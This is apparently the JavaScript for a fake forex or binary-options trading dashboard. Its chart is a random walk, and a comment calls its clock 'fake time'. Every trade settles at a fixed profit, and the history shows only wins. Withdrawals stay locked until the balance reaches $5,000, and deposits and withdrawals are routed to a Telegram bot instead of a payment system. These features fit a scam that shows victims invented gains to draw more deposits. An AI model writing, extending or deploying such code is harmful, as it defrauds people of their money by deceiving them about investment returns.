let currentUserEmail = null;
let currentAccount = 'real';
let uiState = { realBalance: 110.00, demoBalance: 50000.00, realHistory: [], demoHistory: [] };

const authScreen = document.getElementById('auth-screen');
const dashboard = document.getElementById('dashboard');
const authEmail = document.getElementById('auth-email');
const authPassword = document.getElementById('auth-password');
const authSubmitBtn = document.getElementById('auth-submit-btn');
const authSub = document.getElementById('auth-sub');
const authToggleLink = document.getElementById('auth-toggle-link');
const authLoading = document.getElementById('auth-loading');

const canvas = document.getElementById('chart');
const ctx = canvas.getContext('2d');
let currentPrice = 1.68914;
let priceHistory = [];
let activeTrades = [];
let chartRunning = false;
let tickInterval = null;
let chartSpeedMs = 100; 
const MAX_POINTS = 60;

function formatMoney(n) { return '$' + Number(n).toFixed(2); }
function formatPrice(p) { return Number(p).toFixed(5); }

function updateUIBasedOnAccount() {
  const isReal = currentAccount === 'real';
  const balance = isReal ? uiState.realBalance : uiState.demoBalance;
  const history = isReal ? uiState.realHistory : uiState.demoHistory;

  document.getElementById('nav-balance').textContent = formatMoney(balance);
  document.getElementById('nav-account-name').textContent = isReal ? 'QT Real' : 'QT Demo';
  
  document.getElementById('finance-real-balance').textContent = formatMoney(uiState.realBalance);
  const withdrawInput = document.getElementById('withdraw-amount-input');
  const withdrawBtn = document.getElementById('withdraw-btn');
  const withdrawMsg = document.getElementById('withdraw-status-msg');
  
  if (uiState.realBalance >= 5000) {
    withdrawInput.disabled = false;
    withdrawBtn.disabled = false;
    withdrawBtn.classList.remove('disabled-btn');
    withdrawMsg.textContent = "You are eligible to withdraw!";
    withdrawMsg.style.color = "#16A765";
  } else {
    withdrawInput.disabled = true;
    withdrawBtn.disabled = true;
    withdrawBtn.classList.add('disabled-btn');
    withdrawMsg.textContent = `You need $5,000.00 to unlock withdrawal.`;
    withdrawMsg.style.color = "#8b9eb3";
  }

  document.getElementById('profile-email').textContent = currentUserEmail || 'user@example.com';
  document.getElementById('side-menu-email').textContent = currentUserEmail || 'user@example.com';
  document.getElementById('profile-real-balance').textContent = formatMoney(uiState.realBalance);
  document.getElementById('profile-demo-balance').textContent = formatMoney(uiState.demoBalance);

  document.getElementById('history-title').textContent = isReal ? 'REAL ACCOUNT HISTORY' : 'DEMO ACCOUNT HISTORY';
  const historyList = document.getElementById('history-list');
  historyList.innerHTML = '';
  if (history.length === 0) {
    historyList.innerHTML = '<div class="history-empty">No trades yet.</div>';
  } else {
    history.forEach(trade => {
      const div = document.createElement('div');
      div.className = 'history-item';
      div.innerHTML = `<span>${trade.pair} • ${trade.direction} • $${Number(trade.amount).toFixed(2)}</span><span class="win">+$${Number(trade.profit).toFixed(2)}</span>`;
      historyList.appendChild(div);
    });
  }
}

window.switchAccount = function(type) {
  currentAccount = type;
  updateUIBasedOnAccount();
  document.getElementById('account-dropdown').classList.remove('active');
};

window.openPage = function(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
  document.getElementById('page-' + pageId).classList.add('active-page');
  document.querySelectorAll('.bottom-nav-item').forEach(n => n.classList.remove('active'));
  const navBtn = document.getElementById('nav-' + pageId);
  if (navBtn) navBtn.classList.add('active');
  if (pageId === 'trading') setTimeout(resizeCanvas, 50);
};

window.toggleSideMenu = function() {
  document.getElementById('side-menu').classList.toggle('active');
  document.getElementById('side-menu-overlay').classList.toggle('active');
};

function resizeCanvas() {
  if (!canvas) return;
  const wrap = canvas.parentElement;
  if (wrap.clientWidth === 0) return;
  canvas.width = wrap.clientWidth;
  canvas.height = wrap.clientHeight;
  drawChart();
}
window.addEventListener('resize', () => { if (currentUserEmail) resizeCanvas(); });

function startChart() {
  if (chartRunning) return;
  chartRunning = true;
  resizeCanvas();
  priceHistory = [];
  for (let i = 0; i < MAX_POINTS; i++) priceHistory.push(currentPrice);
  tickInterval = setInterval(tick, chartSpeedMs);
}

function tick() {
  const drift = (Math.random() - 0.5) * 0.00025;
  currentPrice = Math.max(0.001, currentPrice + drift);
  priceHistory.push(currentPrice);
  if (priceHistory.length > MAX_POINTS) priceHistory.shift();
  
  document.getElementById('live-price').textContent = formatPrice(currentPrice);
  
  // Update fake time
  const now = new Date();
  const timeStr = now.toTimeString().split(' ')[0] + ' UTC+3';
  document.getElementById('live-time').textContent = timeStr;
  document.getElementById('expiry-time-top').textContent = timeStr; // Simplified for demo

  drawChart();
  checkActiveTrades();
}

function drawChart() {
  if (!ctx) return;
  const w = canvas.width;
  const h = canvas.height;
  ctx.clearRect(0, 0, w, h);

  // Draw horizontal grid lines
  ctx.strokeStyle = '#1f2e45'; 
  ctx.lineWidth = 1;
  for (let i = 1; i < 5; i++) {
    const y = (h / 5) * i;
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
  }

  if (priceHistory.length < 2) return;

  let min = Math.min(...priceHistory);
  let max = Math.max(...priceHistory);
  if (max - min < 0.0001) { min -= 0.0001; max += 0.0001; }
  const range = max - min;

  const pad = 10;
  const points = priceHistory.map((p, i) => ({ 
    x: pad + (i / (MAX_POINTS - 1)) * (w - pad * 2), 
    y: h - pad - ((p - min) / range) * (h - pad * 2) 
  }));

  // Gradient Fill
  const grad = ctx.createLinearGradient(0, 0, 0, h);
  grad.addColorStop(0, 'rgba(39, 119, 232, 0.3)'); 
  grad.addColorStop(1, 'rgba(39, 119, 232, 0)');
  ctx.beginPath(); 
  ctx.moveTo(points[0].x, h);
  points.forEach(p => ctx.lineTo(p.x, p.y));
  ctx.lineTo(points[points.length - 1].x, h); 
  ctx.closePath(); 
  ctx.fillStyle = grad; 
  ctx.fill();

  // Line
  ctx.beginPath();
  points.forEach((p, i) => { if (i === 0) ctx.moveTo(p.x, p.y); else ctx.lineTo(p.x, p.y); });
  ctx.strokeStyle = '#4da6ff'; 
  ctx.lineWidth = 2.5; 
  ctx.stroke();

  // Current Dot
  const last = points[points.length - 1];
  ctx.beginPath(); 
  ctx.arc(last.x, last.y, 5, 0, Math.PI * 2); 
  ctx.fillStyle = '#4da6ff'; 
  ctx.fill();
  
  // Draw horizontal line from current dot
  ctx.beginPath();
  ctx.moveTo(last.x, last.y);
  ctx.lineTo(w, last.y);
  ctx.strokeStyle = '#4da6ff';
  ctx.lineWidth = 1;
  ctx.setLineDash([5, 5]);
  ctx.stroke();
  ctx.setLineDash([]);
}

// AUTH LOGIC
let isSignupMode = false;
authToggleLink.addEventListener('click', () => {
  isSignupMode = !isSignupMode;
  authSub.textContent = isSignupMode ? "Create a new account" : "Sign in to your dashboard";
  authSubmitBtn.textContent = isSignupMode ? "SIGN UP" : "LOG IN";
  authToggleLink.textContent = isSignupMode ? "Already have an account? Log In" : "Don't have an account? Sign Up";
});

authSubmitBtn.addEventListener('click', async (e) => {
  e.preventDefault();
  const email = authEmail.value.trim();
  const password = authPassword.value.trim();
  if (!email || !password) return alert("Please fill in all fields.");
  
  if (isSignupMode) {
    try {
      const response = await fetch('/api/signup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
      const data = await response.json();
      if (!response.ok) return alert(data.error);
      alert("Account created! Please log in.");
      authToggleLink.click();
    } catch (err) { alert("Connection error."); }
  } else {
    authSubmitBtn.style.display = 'none';
    authLoading.style.display = 'block';
    setTimeout(async () => {
      try {
        const response = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await response.json();
        if (!response.ok) { alert(data.error); authSubmitBtn.style.display = 'block'; authLoading.style.display = 'none'; return; }
        currentUserEmail = data.email; uiState.realBalance = data.realBalance; uiState.demoBalance = data.demoBalance; uiState.realHistory = data.realHistory; uiState.demoHistory = data.demoHistory;
        authScreen.style.display = 'none'; dashboard.classList.add('active');
        currentAccount = 'real'; updateUIBasedOnAccount(); startChart(); 
        openPage('trading');
      } catch (err) { alert("Connection error."); authSubmitBtn.style.display = 'block'; authLoading.style.display = 'none'; }
    }, 1500); 
  }
});

// TIMER LOGIC
let tradeTimerSeconds = 3;
const expirySelect = document.getElementById('timeframe-select');
const timerDisplay = document.getElementById('trade-time-display');

expirySelect.addEventListener('change', (e) => {
  const seconds = parseInt(e.target.value, 10);
  tradeTimerSeconds = seconds;
  
  if (seconds < 60) timerDisplay.value = `00:00:${seconds.toString().padStart(2, '0')}`;
  else if (seconds < 3600) timerDisplay.value = `00:${Math.floor(seconds/60).toString().padStart(2, '0')}:00`;
  else timerDisplay.value = `${Math.floor(seconds/3600).toString().padStart(2, '0')}:00:00`;

  // Update chart speed based on time
  if (seconds <= 5) chartSpeedMs = 100;        
  else if (seconds <= 60) chartSpeedMs = 300;  
  else if (seconds <= 3600) chartSpeedMs = 1000; 
  else chartSpeedMs = 3000;                    

  if (chartRunning) {
    clearInterval(tickInterval);
    tickInterval = setInterval(tick, chartSpeedMs);
  }
});

// TRADING LOGIC
function executeTrade(direction) {
  if (!currentUserEmail) return;
  const amount = parseFloat(document.getElementById('amount-input').value);
  const isReal = currentAccount === 'real';
  const currentBalance = isReal ? uiState.realBalance : uiState.demoBalance;
  const profit = isReal ? 25.00 : 50.00;
  
  if (!Number.isFinite(amount) || amount <= 0) return alert('Enter a valid amount.');
  if (amount > currentBalance) return alert(`Insufficient ${currentAccount} balance.`);
  
  if (isReal) uiState.realBalance -= amount; else uiState.demoBalance -= amount;
  updateUIBasedOnAccount();
  
  const simulatedWait = tradeTimerSeconds > 60 ? 5000 : (tradeTimerSeconds * 1000); 
  const endTime = Date.now() + simulatedWait;
  
  activeTrades.push({ accountType: currentAccount, amount, profit, direction, pair: document.getElementById('pair-select').value, endTime, settled: false });
}

async function checkActiveTrades() {
  const now = Date.now();
  for (let i = 0; i < activeTrades.length; i++) {
    let trade = activeTrades[i];
    if (trade.settled || now < trade.endTime) continue;
    trade.settled = true;
    
    try {
      const response = await fetch('/api/trade', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUserEmail, accountType: trade.accountType, amount: trade.amount, profit: trade.profit, pair: trade.pair, direction: trade.direction }) });
      const data = await response.json();
      if (response.ok) {
        if (trade.accountType === 'real') { uiState.realBalance = data.newBalance; uiState.realHistory = data.history; } 
        else { uiState.demoBalance = data.newBalance; uiState.demoHistory = data.history; }
        updateUIBasedOnAccount();
      }
    } catch (e) { console.error(e); }
  }
}

document.getElementById('buy-btn').addEventListener('click', () => executeTrade('BUY'));
document.getElementById('sell-btn').addEventListener('click', () => executeTrade('SELL'));

document.getElementById('account-selector-btn').addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('account-dropdown').classList.toggle('active'); });
document.addEventListener('click', (e) => { 
  if (!document.getElementById('account-selector-btn').contains(e.target) && !document.getElementById('account-dropdown').contains(e.target)) { 
    document.getElementById('account-dropdown').classList.remove('active'); 
  } 
});

// FINANCE
window.processDeposit = function() {
  const amount = parseFloat(document.getElementById('deposit-amount-input').value);
  if (!Number.isFinite(amount) || amount < 10) return alert("Minimum deposit is $10.00");
  alert(`Your deposit prompt of $${amount.toFixed(2)} is pending.\n\nWait for approval in your account linked to this account.`);
  const message = encodeURIComponent(`Hello, I am having a problem making a deposit of $${amount.toFixed(2)}. My email is ${currentUserEmail}. Please assist.`);
  window.open(`https://t.me/JAMES_AI_TRADING_BOT?text=${message}`, '_blank');
};

window.processWithdrawal = function() {
  const amount = parseFloat(document.getElementById('withdraw-amount-input').value);
  if (!Number.isFinite(amount) || amount < 5000) return alert("Minimum withdrawal is $5,000.00");
  if (amount > uiState.realBalance) return alert("Insufficient balance.");
  alert(`Withdrawal request for $${amount.toFixed(2)} received.\n\nYou will now be redirected to support.`);
  const message = encodeURIComponent(`Hello, I want to make a withdrawal of $${amount.toFixed(2)} from my Real Account. My email is ${currentUserEmail}. Please guide me.`);
  window.open(`https://t.me/JAMES_AI_TRADING_BOT?text=${message}`, '_blank');
};
